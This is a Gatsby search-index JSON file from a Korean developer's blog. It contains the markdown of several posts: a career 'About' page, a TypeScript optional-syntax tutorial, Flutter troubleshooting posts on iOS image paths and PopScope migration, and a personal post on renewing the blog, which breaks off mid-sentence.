{"componentChunkName":"component---src-pages-search-jsx","path":"/search/","result":{"data":{"allMarkdownRemark":{"nodes":[{"excerpt":"About  과거에는... 대학생 때 네트워크 엔지니어를 꿈꿨지만, 잡스의 맥북 프리젠테이션을 본 뒤, 개발자의 길로 환승. 재학 중 창업의 길도 꿈을 꾸었지만, 방향성 잡기 실패와 철 없는 시절 시간의 낭비로 꿈을 접음. iOS 프리랜서를 하면서 학업과 병행하다가, 소프트웨어 맴버쉽에 도전하였고, 삼성전자에 입사  대기업에서 스타트업으로... 남들은 삼…","fields":{"slug":"/default/about/"},"frontmatter":{"date":"November 11, 2024","title":"About","description":null,"tags":["About"],"series":"About","previewImage":null,"isPrivate":null},"rawMarkdownBody":"\n# About\n\n![](my.png)\n\n## 과거에는...\n\n대학생 때 네트워크 엔지니어를 꿈꿨지만, 잡스의 맥북 프리젠테이션을 본 뒤,  \n개발자의 길로 환승.\n\n재학 중 창업의 길도 꿈을 꾸었지만, 방향성 잡기 실패와 철 없는 시절 시간의 낭비로 꿈을 접음.  \niOS 프리랜서를 하면서 학업과 병행하다가, 소프트웨어 맴버쉽에 도전하였고, 삼성전자에 입사\n\n![](img_05.png)\n\n## 대기업에서 스타트업으로...\n\n남들은 삼성전자 무선에 다닌다 하면 부러워하였지만, 현실은 글쎄...  \n뭐 사람마다 다르겠지만, 내가 생각한 대기업 삼성전자와는 정말 많이 다름을 느낌.\n\n시스템만 갖춰있지, 정말 까라면 까라는 문화가 많았고, 정말 멱살 잡을 뻔한 책임급 직원도 있었음.  \n강직되고, 수직 문화가 두터운 곳에 적응하지 못한 나는 다른 부서로 전배.\n\n다행히 옮겨온 곳에는 좋은 사람도 있었고, 개발자로써 역량을 조금이나마 키울 수 있었음.  \n하지만 당시 부서 임원이 개발을 불필요한 존재라 생각했고, 이후 빅스비 지원 부서로 강제 전배.\n\n엑셀 노가다나 잡무 등을 하면서 도저히 아닌것 같아서 결국 퇴사를 결정.  \n이후 스마트팩토리 솔루션 스타트업과 블록체인 스타트업을 전전.\n\n그리고 판교에 한 스타트업에 입사.\n![](img_07.png)\n\n처음에는 백엔드 개발자로 재미있게 근무를 하였지만,  \n대표의 이중성과 사람을 갈아넣는 일정 제공,  \n업무 강도에 비해 턱 없이 낮은 임금, 계속되는 야근으로 인해 점점 지쳐감.\n\n남의 회사에 죽어라 몸 갈리는 짓하다가 현실을 깨닫고, 방향성을 잃고 살게 됨.\n\n![](img_08.png)\n\n## 개발업(業)에 대한 강한 회의감\n\n퇴사 전 이직을 정말 열심히 준비함.\n\n![](img_09.png)\n\n스타트업부터 대기업까지 다양한 곳을 찾고 준비해봤지만,  \n내가 가진 실력이 그렇게 높지 않다는 것을 다시한번 깨닫게 됨.\n\n이후 이직에 실패한 뒤 퇴사하고 곰곰히 생각하는 자아성찰 시간을 가짐.\n\n특히 개발에 죽어라 시간을 보낸 것에 많은 회의감이 많이 들었음.  \n당시 대기업 연봉에서 스타트업 연봉으로 내려오니 많은 현타가 옴.\n\n결국 직장에 다니는게 개발 잘하려는게 아니라 시간을 돈으로 치환하는게 주 목적인데,  \n어짜피 개발 열심히 해도, 위로 갈 수 있는 직업군이 아니란 것을 깨닫게 됨.  \n(네카라쿠배당토 포함)\n\n게다가 **개발자는 무한에 가까운 학습이 필요**한데, 세상은 자본주의가 깊어지고,  \n개발 지식은 일할 때 빼곤 쓸모가 없다고 느낌.  \n즉 **시간 투자 대비 급여 하방도 낮거나 중간**에 취업 잘 되는 거 빼곤 전부 디 메리트.\n\n부모 버프나 쩔 안 받으면 안정적인 수도권(광교,수지,분당,위례,대치,흑석,강남3구 등)에 안착도 불가능하며, 추후 노후에 불안정한 삶, 돈 없는 서러움등이 반기는게 현실.\n\n결국 노후 보장 또는 사람답게 살려면 인컴이 높거나, 보유 자산가치와 생활 물가의 연동성이 매우 중요.\n\n현 대한민국에서 급여 노동자 탑티어는 사자 직업군밖에 없고,  \n부의 영역에 오는 사람들은 1티어 자영업군,  \n또는 창업해서 엑싯한 스타텁 대표 등.\n\n부를 축적한 사람들 중엔 **개발자라는 직업군**은 없었음.\n\n그러다가 1차 코인장에 몇 지인이 50억, 100억 자산가가 되는거 보고 현타가 강하게 옴.  \n당시 지인 따라 트리마제랑 강남3구 아파트 임장을 같이 가봤는데, 내가 사는 곳과 급 차이를 강하게 느낌.\n\n당시 부동산 지식이 없었더라도, 경기도 하급지에 살던 내가 경험한 것은 너무 충격적이었음.\n\n**대한민국에서는 개발자로는 절대 노후대비 및 자아실현이 불가능함을 깨닫고,**  \n모은 돈으로 부동산과 주식 투자, 다시없을 유동성 파도에서 겨우 기회를 구함.\n\n## 부동산 시장에 몸 담그기\n\n지인 덕분에 부동산이라는 시장에 눈을 뜨고, 이것저것 공부해봄.  \n지방부터 해서 이곳저곳 다녀보고, 임장을 정말 많이 다님.\n\n당시 부동산 규제는 이렇게 심한 편은 아니었고, 갭을 놓고, 매수와 매도,  \n직접 등기소에 등기를 치면서 시장을 배워나감.\n\n이렇게 하면서 단순 개발 노동자로 살면서 정해진 급여를 받는 것이 아닌,  \n자본을 굴려서 키워나가는 재미를 찾게됨.\n\n![](img_06.png)\n\n지방부터 해서 수도권 지역의 하급지부터 중, 상급지까지 올라오면서 정말 많은 것을 배움.\n\n당시 **호갱노노**와 **네이버 부동산**을 정말 잘 사용하였는데, 진심 저거 개발한 회사로,  \n다시 취업해보고 싶어지기고 했음.\n\n전에 비해 삶이 여유가 생기고, 다양한 취미생활을 하며, 삶을 돌아봄.  \n시간이 지나고, 나만의 서비스를 만들어 보고 싶어서 다시 개발에 손을 대기 시작.\n\n## 개인 서비스를 위해 다시 개발업으로...\n\n초창기 MML(MyMeLink)와 [흑우집합소(로또서비스)](https://bcow.world)를 개발해보며, 다시 개발자의 길을 걷게 됨.  \n전에는 백엔드 포지션에 자바&스프링 원툴.\n\n혼자서 모든 것을 커버하기 위해 프론트(React, Next.Js 등)와 백엔드(Nest.Js),  \n그리고 플러터를 통해 앱, 웹 모두 커버하는 풀스택 개발자로 전향.\n\n그러던 중 와인에 빠지기 시작하면서 조금씩 와인이라는 영역에 발을 담금.\n\n![](img_10.png)\n\n외인을 마시면서 시음 노트, 보유 와인 관리, 셀러 관리 등 몇 가지 기능을 필요하여 찾아보았으나,  \n내가 원하는 기능을 만족하는 서비스는 없었음.\n\n그래서 직접 서비스를 만들기 시작했고, [안드로이드 앱](https://play.google.com/store/apps/details?id=dev.mhlab.myc)과 [아이폰 앱](https://itunes.apple.com/kr/app/apple-store/6474965246)을 출시함.  \n이후 와인 가격 조회 서비스인 [마와셀 웹](https://appmyc.info) 서비스를 오픈.\n\n## 현재 그리고 ING\n\n마와셀 개발을 하며, 서비스를 조금씩 키워가고 있으며,  \n혼자 일하는 것보다 다른 사람들과 일하는 재미를 다시 느껴보기 위해 재취업길도 알아보며 사는 중.\n\n## END\n\n고생하셨잖아.  \n한잔해.\n![Louis Roederer 243 Collection](img_01.jpg)\n\n---\n"},{"excerpt":"Dart에서 자주 쓴 Optional 간만에 글을 남긴다. 최근 마와셀 앱 업데이트 후 와인 정보를 위해 웹쪽을 다시 개발하고 있다. 코로나 걸려서 잠시 쉬다가, 침대에서 빈둥거리기도 시간이 아까워서 누워있다가, 옵시디언에 정리해둔 내용을 올려둔다. 웹(Typescript)을 개발하다가 앱(Dart)로 넘어갔을 때 Typescript와 매우 흡사해서 바로…","fields":{"slug":"/js_ts/240827_optional/"},"frontmatter":{"date":"August 27, 2024","title":"Typescript에서 옵셔널(Optional) 사용하기","description":null,"tags":["Typescript","VSCode"],"series":"JS_TS","previewImage":"typescript_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_jsts.png)\n\n## Dart에서 자주 쓴 Optional\n\n간만에 글을 남긴다.  \n최근 마와셀 앱 업데이트 후 와인 정보를 위해 웹쪽을 다시 개발하고 있다.\n\n코로나 걸려서 잠시 쉬다가, 침대에서 빈둥거리기도 시간이 아까워서 누워있다가,  \n옵시디언에 정리해둔 내용을 올려둔다.\n\n웹(Typescript)을 개발하다가 앱(Dart)로 넘어갔을 때 Typescript와 매우 흡사해서 바로 사용하는데 큰 문제는 없었다.  \n그 중 Dart의 유용한 기능 중 하나가 옵셔널(Optional)이었다.\n\nDart의 경우 버전이 올라가면서 Null-Safe한 특성이 추가되었는데,  \n아래와 같이 사용된다.\n\n```dart\nWineModel getWineData(String? wineItemId) {\n    ...\n}\n```\n\n그렇다.  \n이 기능은 Typescript에도 존재하는 기능이다.\n\nJavascript를 사용할 때는 뭐 그냥 null이던 undefined던 타입 체킹을 안하고,  \n무식하게(?) 그냥 쓰기에 볼 일이 없지만, Typescript를 사용한다면 타입 명시가 중요하다.\n\n근데 사용하다 보면 특정 값의 속성이 있어도, 없어도 무관한 값이 있다.  \n그 경우 옵셔널(Optional)을 사용하게 된다.\n\n<br>\n\n### 옵셔널 속성 (Optional Property)\n\n나같은 경우 타입을 지정할 때 인터페이스를 사용한다.  \n그 안의 속성에 옵셔널을 지정할 때 위에서 보인 Dart와 동일하게 <b>?</b>를 사용한다.\n\n```typescript\nexport interface WineryInfo {\n  wineryName: string\n  description: string\n  country: string\n  address?: string\n}\n```\n\n이렇게 선언된 타입을 사용한다면 아래와 같이 사용된다.\n\n```typescript\nconst mollydookerWineryInfo: WineryInfo = {\n  wineryName: \"Mollydooker\",\n  description: \"The best of australia winery.\",\n  country: \"Australia\",\n  address: \"McLaren Vale\",\n}\n```\n\n몰리두커라고 내가 좋아하는 와이너리가 있는데 이렇게 표현할 수 있다.  \n근데 만약 Address 정보가 불명인 와이너리 정보가 있다고 가정해보자.\n\n```typescript\nconst krugWineryInfo: WineryInfo = {\n  wineryName: \"krug\",\n  description:\n    \"The House of Krug was founded in Reims by Joseph Krug, a visionary non-conformist with an uncompromising philosophy. His dream was to go beyond the notion of vintage and craft the very best Champagne he could offer, every single year, regardless of climate variations\",\n  country: \"France\",\n}\n```\n\n샴페인의 끝판왕인 크룩 와이너리 정보다.  \n크룩 와이너리의 경우 주소(address) 속성이 없다.  \n하지만 address의 경우 옵셔널(Optional) 값이기에 없어도 무방하다.\n\n<br>\n\n### 옵셔널 매개변수 (Optional Parameter)\n\n함수나 메서드에 전달되는 매개변수(Parameter)에도 옵셔널을 사용할 수 있다.  \n이 경우 값이 없을 때 **undefined**로 처리된다.\n\n약간 억지스러운 예제이긴 한데.. -\\_-;;  \n와인 정보를 가져오는 함수가 있다고 하자.\n\n```typescript\nconst getWineInfo = async (wineName: string, wineDes?: string): WineInfo => {\n  const wineData = await getWineData(wineName)\n\n  return { wineData, description: wineDes || \"-\" }\n}\n```\n\n저기서 보면 **wineDes**라는 파라메터가 옵셔널하여 주는 값에 따라 반환 값이 변한다.  \n만약 wineDes 값이 없다면 하이픈(-) 표시로 대체해서 적용된다.\n\n<br>\n\n### 옵셔널 체이닝 (Optional Chaining)\n\n이 문법은 Typescript 3.7 부터 도입되었다.  \n해당 객체의 속성 또는 함수(또는 메서드)가 없는 경우 **undefined**를 반환하는 방법을 제공한다.\n\n아래의 예제 코드를 보자.\n\n```typescript\nconst someWineData = {\n  itemId: \"france_wine_0000001\",\n  wineName: \"Blanc d'Assemblage Brut Nature Champagne\",\n  wineType: \"Champagne\",\n  wineryInfo: {\n    wineryName: \"Chavost\",\n    wineryDes:\n      \"Our Champagnes are singular and atypical wines, their own identity comes from a mastered vinification, and the absolute absence of added sulphites.\",\n  },\n}\n\nconst wineName = someWineData.wineName\nconst wineryAddress = someWineData.wineryInfo.address\n```\n\n여기서 **wineName**속성의 경우 값이 있어서 Blanc d'Assemblage Brut Nature Champagne 라는 값이 정상적으로 출력된다.\n\n하지만 **wineryAddress**속성의 경우 wineryInfo안에 address 값은 존재하지 않기에 undefined가 반환된다.\n\n옵셔널 체이닝은 다음과 같은 상황에서 유용하다.\n\n- 중첩된 객체의 속성에 접근할 때 해당 속성이 존재하는지 알 수 없는 경우\n- 함수(메서드)가 존재하지 않을 수 있는 객체에서 메서드를 호출할 때\n\n<br>\n\n### 널 병합 연산자 (??) (Nullish Coalescing Operator)\n\n?를 하나만 사용하면 삼항연산자인데 하나 더 붙이면 널 병합 연산자가 된다.  \ndart에서 아주 잘 쓰고 있는 문법 중 하나인데 아래와 같이 사용할 수 있다.\n\n```typescript\nfunction getWineInfo(wineModel: WineModel): WineInfo {\n  return {\n    wineName: wineModel.wineName,\n    wineDes: wineModel?.wineDes ?? \"some wine.\",\n  }\n}\n```\n\n저 함수를 보면 WineInfo라는 객체를 반환한다.  \n근데 **wineDes**속성의 경우 모델 값이 없다면 기본 값을 대신 넣어준다.\n\n<br>\n\n### 옵셔널 반환 타입 (Optional Return Type)\n\n데이터베이스에서 값을 조회할 때 해당 값이 없을 수도 있다.  \nReact 예제를 가져올까 했는데 딱 떠오르는게 없고 해서 백엔드 쪽으로...  \n(이것도 약간 어거지 코드다.)\n\n```typescript\nexport class MyWineFindWineNameRepository\n  implements MyWineFindWineNameOutboundPort\n{\n  constructor(\n    @InjectModel(MyWine.name)\n    private readonly myWineEntity: Model<MyWine>\n  ) {}\n\n  async execute(\n    params: MyWineFindWineNameInputDto\n  ): Promise<MyWineEntity | null> {\n    if (params.wineNameKr !== undefined) {\n      return this.myWineEntity.findOne({ wineNameKr: params.wineNameKr }).exec()\n    }\n    return this.myWineEntity.findOne({ wineNameEn: params.wineNameEn }).exec()\n  }\n}\n\n/// 기타 작업 후\n///...\n\nconst wines = await this.myWineFindWineNameRepository.execute({ wineNameEn })\nif (wines) {\n  console.log(\"Found wines:\", wines.wineNameEn)\n} else {\n  console.log(\"Not found wine\")\n}\n```\n\n약간 어거지 코드이긴 한데..  \n와인 이름을 검색해서 특정 조건에서 값을 찾을 수 없다면, 반환 타입에 undefined를 포함시킬 수 있다.\n\n사실 이렇게 안히고, Repository에서는 저렇게 반환하고,  \nInbound 서비스 단에서 와인 데이터 유무를 확인하여 처리할 수 있다.\n\n## 요약\n\n옵셔널을 요약하면 다음과 같다.\n\n- ?를 사용해 옵션 속성 또는 매개변수를 선언할 수 있다.\n- 옵셔널 체이닝(?.)으로 안전하게 객체의 속성에 접근할 수 있다.\n- ?? 연산자를 사용해 null 또는 undefined인 경우 기본값을 설정할 수 있다.\n- 옵셔널 속성이나 매개변수를 사용할 때 기본값 설정, 조건문, 옵셔널 체이닝 등을 활용해 안전하게 처리해야 한다.\n\n옵시디언에 썼던 자료에 살 붙이고 하니 글이 늘었다.  \n게다가 코로나 약 기운이 돌아서 나중에 다시 검수해야 할듯...\n\n```toc\n\n```\n"},{"excerpt":"이미지를 다루다가... 전에 마와셀 1.0 버전대 개발을 하다 겪은 일이다. 마와셀에는 와인 사진 및 셀러, 시음 노트에 이미지를 첨부하는 기능이 있다.  안드로이드에서는 잘 되어서 문제없이 넘어갔다가, iOS도 실제 디바이스에서 테스트를 진행하면서 문제가 없음을 확인했었다. 하지만 iPad용 스크린샷이 필요해서 시뮬레이터에서 구동하다가 문제가 생겼다. …","fields":{"slug":"/dart_flutter/240814_ios-photo/"},"frontmatter":{"date":"August 14, 2024","title":"Flutter에서 이미지를 다룰 때 iOS의 경로 문제 (Stored image is missing)","description":"Flutter에서 Android와는 다른 iOS 이미지 경로 문제","tags":["Flutter","iOS","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n## 이미지를 다루다가...\n\n전에 마와셀 1.0 버전대 개발을 하다 겪은 일이다.  \n마와셀에는 와인 사진 및 셀러, 시음 노트에 이미지를 첨부하는 기능이 있다.\n\n![](/img01.jpg)\n\n안드로이드에서는 잘 되어서 문제없이 넘어갔다가,  \niOS도 실제 디바이스에서 테스트를 진행하면서 문제가 없음을 확인했었다.\n\n하지만 iPad용 스크린샷이 필요해서 시뮬레이터에서 구동하다가 문제가 생겼다.\n\n<br>\n\n## 이미지를 못 가져옴\n\n시뮬레이터를 끈 다음 빌드 후 다시 접근하는데 이미지가 없어서 앱 크래시가 발생했다.  \n물론 2.0에서는 이미지가 없을 때 기본 이미지 표시로 바꾸긴 했다.\n\n마와셀의 이미지는 파일명만 가져와서 저장을 하게 된다.  \n경로의 경우 조립해서 사용하는 방식을 사용했다.\n\n로직에는 문제가 없었고,  \n뭔가 이상함을 느낀 나는 몇 가지 로그를 남기며 테스트를 했다.  \n그 결과 시뮬레이터의 이미지 경로가 계속 변경함을 찾을 수 있었다.\n\n- 첫 번째 테스트 빌드 하였을 때 경로\n\n> /Users/testMan/Library/Developer/CoreSimulator/Devices/73169529-CF2Z-20FT-U1A1-O23DBE772DCA/data/Containers/Data/Application/2DQ07F26-AB29-968D-00FA-DOQE96A35B27/Documents/tmp_img/2233-FF00-img001.png\n\n- 두 번째 테스트 빌드 하였을 때 경로\n\n> /Users/testMan/Library/Developer/CoreSimulator/Devices/73169529-CF2Z-20FT-U1A1-O23DBE772DCA/data/Containers/Data/Application/576G7D01-Z3K0-D2K1-6FFQ-J6YF3ME8A02B/Documents/tmp_img/O1DV-W991-img001.png\n\n<br>\n\n## iOS는 별도 구현이 필요\n\n위 로그를 보면 알겠지만, 어플리케이션 ID가 계속 변함을 알 수 있다.\n\n저 앱 ID의 경우 **path_provider**의 **getApplicationDocumentsDirectory**를 통해서 가져오게 된다.\n\n```dart\nclass DirectoryManager {\n  late final Directory appDir;\n  late final Directory tmpDir;\n\n  DirectoryManager();\n\n  Future<void> init() async {\n    appDir = await getApplicationDocumentsDirectory();\n    tmpDir = Directory('${appDir.path}/tmpRes');\n\n    await _createDirectories();\n  }\n}\n```\n\n난 디렉토리랑 파일을 다루는 별도의 클래스를 두고,  \n**get_it**을 통해서 Injection 해서 사용한다.\n\n해당 문제를 수정하려면 결국 경로를 플랫폼마다 조정해서 써야 한다.  \n아래의 코드를 참고하자.\n\n```dart\ntry {\n      String imgPath;\n\n      ///Android\n      if (Platform.isAndroid) {\n        imgPath = _getAttachImageFullPath(attachImageEnum);\n      }\n\n      ///iOS\n      else if (Platform.isIOS) {\n        imgPath =\n            \"${dirManager.appDir.path}/${attachImageEnum.getAttachPath()}\";\n      }\n      // 웹이나 다른 플랫폼의 경우 임시 디렉토리 사용\n      else {\n        imgPath = (await getTemporaryDirectory()).path;\n      }\n    } catch (e) {\n      logger.d('[cloneFile] Error: $e');\n    }\n\n/// 다른 함수\nString _getAttachImageCategoryFullPath(AttachImageEnum imgEnum) {\n  final directoryManager = getIt.get<DirectoryManager>();\n  if (imgEnum == AttachImageEnum.wine) {\n    return directoryManager.wine.path;\n  }\n  return directoryManager.tmpDir.path;\n}\n```\n\n내가 사용하는 코드를 잘라서 주요 로직은 잘라낸 예제 코드다.\n\n핵심은 iOS의 경우 **getApplicationDocumentsDirectory**이거를 직접 가져와서  \n뒤에 사용자 경로를 붙이면 되고, 그 외 플랫폼은 그냥 고정된 값을 사용해도 된다.\n\n<br>\n\n## 정리\n\n이걸 처음엔 GPT한테 물어봤는데 내가 프롬프트를 이상하게 줘서 스택에서 찾게 되었다.\n\n[Flutter-iOS when apps update / recompile stored image is missing](https://stackoverflow.com/questions/67859341/flutter-ios-when-apps-update-recompile-stored-image-is-missing)\n\nFlutter는 이런 플랫폼 간 몇 가지 설정을 해줘야 하는 부분이 있다.  \n문제가 생길 땐 Claude나 GPT에게 물어보자.\n\n```toc\n\n```\n"},{"excerpt":"예전에는 잘 사용하던 WillPopScope 플러터(Flutter)를 개발하다 보면, 보통 iOS, Android 두 플랫폼을 대상으로 개발을 한다. iOS는 뒤로가기 라는게 없고, 바로 홈으로 돌아가지만, 안드로이드의 경우 물리(또는 소프트 버튼)을 통해서 뒤로 가기를 할 수 있다. 이런 조작을 보통 네비게이션 조작으로 보는데 WillPopScope의 …","fields":{"slug":"/dart_flutter/240814_willpopscope-deprecated/"},"frontmatter":{"date":"August 14, 2024","title":"WillPopScope 사용 시 Deprecated 가 뜨는 경고","description":"이제는 사용하지 않는 WillPopScope","tags":["Flutter","Troubleshooting"],"series":"Flutter","previewImage":"flutter_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_flutter.png)\n\n## 예전에는 잘 사용하던 WillPopScope\n\n플러터(Flutter)를 개발하다 보면, 보통 iOS, Android 두 플랫폼을 대상으로 개발을 한다.\n\niOS는 뒤로가기 라는게 없고, 바로 홈으로 돌아가지만,  \n안드로이드의 경우 물리(또는 소프트 버튼)을 통해서 뒤로 가기를 할 수 있다.\n\n이런 조작을 보통 네비게이션 조작으로 보는데 WillPopScope의 경우 네비게이션 조작을 돕는 기능이라 할 수 있다.\n\n보통 맨 최 상위 위젯에 아래와 같이 보통 작성한다.\n\n```dart\nreturn WillPopScope(\n      onWillPop: ()  {\n        return _onBackKey();\n      },\n        child: Scaffold()\n      );\n```\n\n근데 저 코드를 사용하면 아래와 같은 경고가 뜬다.\n\n> 'WillPopScope.new' is deprecated and shouldn't be used. Use PopScope instead. This feature was deprecated after v3.12.0-1.0.pre.\n\n3.12.0-1 부터 Deprecated 되니 대안으로 **PopScope**를 사용하라고 한다.\n\n<br>\n\n## 왜 사라짐?\n\n이건 안드로이드가 올라가면서 안드로이드 14 (API 34)부터 **Predictive Back Feature**라는게 도입되고,  \n이에 따라 기존에 플러터에서 사용하던 WillPopScope의 경우 호환되지 않아 Deprecated 된다고 한다.\n\n```\n// Copyright 2014 The Flutter Authors. All rights reserved.\n// Use of this source code is governed by a BSD-style license that can be\n// found in the LICENSE file.\n```\n\n주석만 봐도 14년에 만들어서 잘 사용하던 건데 아무래도 재개발 하는게 더 싸게 먹힌 것 같다.\n\n<br>\n\n### Predictive Back Feature?\n\n간단히 설명하자면 뒤로 가기 제스쳐를 할 때 뒤에 있던(또는 현재 화면 이전에 있던) 화면을 미리 보여주는 기능이다.  \n그냥 iOS에서 스와이프 하면 보이는 기능이랑 유사한 거라 보면 된다.\n\n궁금한 분은 [구글의 공식 유튜브](https://youtu.be/Elpqr5xpLxQ?si=YyALmbrkHhffwlIK)를 참고하자.\n\n<br>\n\n## PopScope\n\n얘는 24년에 나온 따끈따끈한 API다.\n\n```\n// Copyright 2014 The Flutter Authors. All rights reserved.\n// Use of this source code is governed by a BSD-style license that can be\n// found in the LICENSE file.\n```\n\nPopScope도 당연히 위젯인데 대략 아래와 같다.\n\n```dart\nclass PopScope extends StatefulWidget {\n  /// Creates a widget that registers a callback to veto attempts by the user to\n  /// dismiss the enclosing [ModalRoute].\n  const PopScope({\n    super.key,\n    required this.child,\n    this.canPop = true,\n    this.onPopInvoked,\n  });\n  ....\n}\n```\n\nchild의 경우 당연히 필요한 위젯이고, **canPop**과 **onPopInvoked** 두 가지가 있는데 어렵지 않다.\n\n<br>\n\n### canPop\n\n말 그대로 뒤로 넘어갈 수 있는지 여부를 나타내는 파라메타다.  \n기본 값은 **true**로 되어 있지만, 사용자가 특정 이벤트에 뒤로 가기를 막아야 할 경우 false를 주면 된다.\n\n보통 로딩 같은 곳에서 많이 사용한다.\n\n```dart\nreturn PopScope(\n      canPop: !loadingProvider.isLoading,\n      onPopInvoked: (bool isPop) {\n        ///\n      },\n      child: Stack(\n        children: [\n\n        ],\n      ),\n    );\n```\n\n동적으로 로딩 중일 때는 뒤로 가기를 막고,  \n로딩이 끝나면 이동하게끔 해줄 수 있다.\n\n<br>\n\n### onPopInvoked\n\n이 메서드는 뒤로 가기가 동작했을 때 호출되는 콜백 메서드다.  \n참고로 canPop에 값이 false던 true던 무조건 호출된다.\n\n```dart\nonPopInvoked: (bool isPop) {\n    ///\n},\n```\n\n저 isPop의 전달 값이 뒤로 가기 동작에 대한 결과를 가진다.  \ntrue면 성공, false면 실패로 된다.\n\n<br>\n\n## 정리\n\n뭐 복잡할 줄 알았는데 간단하다.  \n사실 내가 풀어서 쓴 것 보다 공식 문서를 보면 더 쉽다. -\\_-;;\n\n- [WillPopScope to PopScope 마이그레이션](https://docs.flutter.dev/release/breaking-changes/android-predictive-back#migration-guide)\n\n```toc\n\n```\n"},{"excerpt":"간만에 글 작성과 리뉴얼... 정말 오랜만에 개발 블로그에 글을 남겨보는 것 같다. 여기가 흑우집합소에서 글이 멈춰 있는걸 보면 정말 많이 방치한 듯 싶다. 흑집소 개발 이후 네이버 블로그만 열심히 글을 남겼다. 주로 와인 시음과 내 로또 서비스인 흑우집합소 관련 글을 남겼다. 흑집소를 개발하면서 와인 앱이 필요하다는 생각이 들었고, 아이디어를 대충 정리…","fields":{"slug":"/my_story/240813_talk/"},"frontmatter":{"date":"August 13, 2024","title":"간만에 정비","description":null,"tags":["My Story"],"series":"My Story","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n## 간만에 글 작성과 리뉴얼...\n\n정말 오랜만에 개발 블로그에 글을 남겨보는 것 같다.  \n여기가 흑우집합소에서 글이 멈춰 있는걸 보면 정말 많이 방치한 듯 싶다.\n\n흑집소 개발 이후 네이버 블로그만 열심히 글을 남겼다.  \n주로 와인 시음과 내 로또 서비스인 흑우집합소 관련 글을 남겼다.\n\n흑집소를 개발하면서 와인 앱이 필요하다는 생각이 들었고, 아이디어를 대충 정리해서 앱으로 올렸다.  \n뭐 이건 개인 서비스 후기로 따로 글을 남겨 보기로 하고...\n\n원래 개발 블로그를 옮겨가려 했다.\n\n<br>\n\n## 개발 블로그 이사?\n\n현재 대다수 사람들이 그러겠지만, 나도 시간이 없다.  \n아주 먼 옛날 내가 너무나도 순수한 개발자 시절...\n\n정말 개발자로 열심히(?) 살던 때 나도 블로그는 직접 만들어서 써야겠다! 라는 생각이 있었다.  \n당시 React나 Vue가 있었지만, 이렇게 까지 많이 쓰진 않았고,  \n보통 개발자 블로그는 지킬(Jekyll)이나 헥소(Hexo)를 많이 사용하였다.\n\n그리고 나도 초반엔 지킬 쓰다가 헥소로 넘어왔다.  \n그래서 여기 포스팅의 오래된 글을 보면 18년도에 쓴 글이고 이사했다고 써 있다.\n\n근데 시간이 흐르고 퍼블리셔라는 직업군이 프론트 엔드라는 이름으로 텍갈이(?)를 하게 되면서  \n이걸 전문적으로 하는 사람이 늘어났고, React가 발전하고, Next.Js가 나오면서 대부흥 시대를 맞이한 것 같다.\n\n뭐 앵귤러나 기타 프레임워크들도 있지만 걔들은 잠시 논외했다.\n\n무튼 마지막 직장을 다닐 때만 해도 나도 블로그를 직접 새로 만들어봐야지 라고 생각을 했었다.  \n그리고 개츠비(Gatsby)가 좀 나오면서 [유명한 분](https://github.com/JaeYeopHan/gatsby-starter-bee)의 탬플릿을 받아서 커스터마이징 해서 썼다.\n\n하지만 뭔가 너무 투박하고, 연관된 라이브러리가 특정 게츠비 버전에 종속되는 등 몇 가지 문제로 인해 바꾸고 싶었다.  \n그래서 직접 개발해보려 했다.\n\n그래서 Next.Js로 직접 [만들었었다.](https://mhlab.vercel.app)\n근데 블로그로 쓰기엔 처음부터 올리는게 일이었고, 일단 중요한 것은 시간이 없었다.\n\n하지만 저 사이트는 그냥 두기 아까워서 개인 프로젝트 소개 및 포폴 사이트로 쓰는 중이다.  \n<del>물론 지금은 또 방치중...</del>\n\n<br>\n\n### 시간과의 싸움\n\n내가 아주 먼 옛날 순수한 개발자 시절엔...  \n그냥 재태크 이런거 보다 개발 자체를 너무 좋아했다.\n\n뭐 그 때도 부동산 갭투는 했는데 그냥 멋 모르고 한번 해봐야지 하던 시즌이고...  \n무튼 퇴근 후 개발 스터디도 가고, 블로그에 글도 남기고, 깃헙에 프로젝트도 올려보고 그랬었다...\n\n하지만 퇴사 이후 다양한 일을 경험하면서 개발로는 돈을 못벌겠구나 싶었다.  \n솔직히 당시 탑티어 회사라는 네카라쿠베당토도 가면 연봉 최소 7천에 경력직 잘 받으면 1억 이런다.\n\n이게 사실 큰 의미가 없는게...\n\n1. 뭘 해도 근로소득자는 세금이 알아서 잘 퍼간다. (개ㅈ같은 국민연금...)\n2. 연봉 높아도 그만큼 개인의 건강(스트레스)과 시간을 철저하게 가져간다. (최소 근무 10시간 이상 + 사람 스트래스)\n3. 개발자는 남는 시간에도 자기 개발(개발 관련, 스터디 등)을 꾸준히 해야 유통기한이 조금씩이라도 늘어난다.\n\n높은 연봉 회사는 2번이 제대로인데, 근로 시간이 최소 10시간 넘을 것이다.  \n8시간인데 억 넘으면...그건 본인 운이 좋은 것...  \n그렇게 2번과 3번 콜라보가 되면 정작 내 시간은 없어진다.\n\n그래서 나는 요새 취업을 조금씩 알아보는데 돈 많이 주는거 필요 없고,  \n8시간 집중해서 근무하고, 러프하진 않은 약간의 업무량이 있는 회사를 찾아보고 있다.  \n(뭐 그런 천국같은 회사가 있겠니? ㅋㅋㅋ)\n\n**절대 돈이 전부가 아니다.** 라는 말을 어느 정도는 공감한다.  \n하지만 돈이 없다면 정말 불행한 삶이 기다리는 것은 당연한 논리다.\n\n솔직히 개발자로 대충 취직해서 살면 노후 보장이 안될 것 같다.\n\n케바케, 사바사겠지만 나의 경우 적어도 노년에는 일 안하고 편하게 보내고 싶다.  \n그냥 지금처럼 와인 마시고 내가 원할 때 여행가고 그런 삶?\n\n이런걸 하려면 건강이 최우선이지만, 그 다음이 자산이다.  \n진짜 나이먹고 돈 없어서 불만족스러운 거주환경에서 아쉬운 소리 들으며 삻기 싫다.\n\n그런 의미에서 시간은 정말 귀중한 자산이고,  \n난 여가 시간에 부동산 분석, 시세 트레킹, 지역 임장 등을 다닌다.\n\n그리고 미주는 적금처럼 야금야금 모으고,  \n국장에선 단타, 코인은 스테이킹이랑 바이넨스 국외 무역(?) 등...\n\n이런걸 하니 옛날처럼 뭘 만들어쓰니 이런걸 도저히 할 수 없었다.\n\n<br>\n\n### 그래서?\n\n결국 티스토리로 다시 옮기려고 했다.  \n일단 글 보는데 불편할 수 있지만, 광고도 좀 붙여서 관리할 